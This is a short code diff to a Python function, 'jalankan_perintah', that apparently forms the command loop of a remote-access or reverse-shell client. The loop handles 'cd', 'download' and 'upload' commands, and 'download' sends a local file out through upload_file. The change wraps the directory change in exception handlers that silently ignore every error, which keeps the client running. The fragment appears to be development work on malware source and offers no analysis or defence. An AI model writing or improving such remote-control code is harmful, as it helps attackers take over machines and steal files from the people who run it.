@@ -195,7 +195,14 @@ def jalankan_perintah():
         if perintah == 'clear':
             pass
         elif perintah[:3] == 'cd ':
-            os.chdir(perintah[3:])
+            try:
+                os.chdir(perintah[3:])
+            except FileNotFoundError:
+                pass
+            except PermissionError:
+                pass
+            except Exception:
+                pass
         elif perintah[:8] == 'download':
             upload_file(perintah[9:])
         elif perintah[:6] == 'upload':
